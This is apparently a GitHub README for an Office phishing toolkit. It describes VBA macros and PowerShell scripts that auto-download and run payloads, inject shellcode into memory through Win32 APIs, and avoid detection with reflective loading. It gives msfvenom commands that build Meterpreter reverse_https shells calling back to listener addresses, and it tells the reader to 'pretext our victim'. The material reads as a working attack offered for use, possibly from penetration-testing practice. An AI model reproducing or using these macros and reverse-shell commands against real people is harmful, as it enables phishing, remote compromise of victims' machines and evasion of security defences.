Basic phishing to auto download our payload than auto execute using vba

phish.vba


Remember to pretext our victim
![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/5683bbc3-0abb-40a1-9e22-69a2ce8f080f)

Intermediate rce via phishing by running executed shellcode in memory by using three Win32 APIs from Kernel32.dll:  
VirtualAlloc_, RtlMoveMemory, and _CreateThread

runner.vba

Will exit when you close office 
![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/ee96d583-50fa-4ff8-ad86-677e35bb54f5)

msfvenom -p  windows/meterpreter/reverse_https lhost=10.10.11.135 lport=443 EXITFUN=thread -f vbapplication


run.ps1 and auto.vba(download and execute run.ps1 from word)
using powershell to call win32 api to execute reverse shell 
To prevent termination added wait forever 
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/16262bf9-823f-4ef6-a482-64ecb68ecbf8)


run2.ps1 and auto.vba
Without calling the add-type function and using reflective technique to evade. 
msfvenom -p windows/meterpreter/reverse_https LHOST=172.22.10.85 LPORT=443 EXITFUNC=thread -f ps1
![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/b59c891f-c500-4bd2-9885-ab7af799c861)
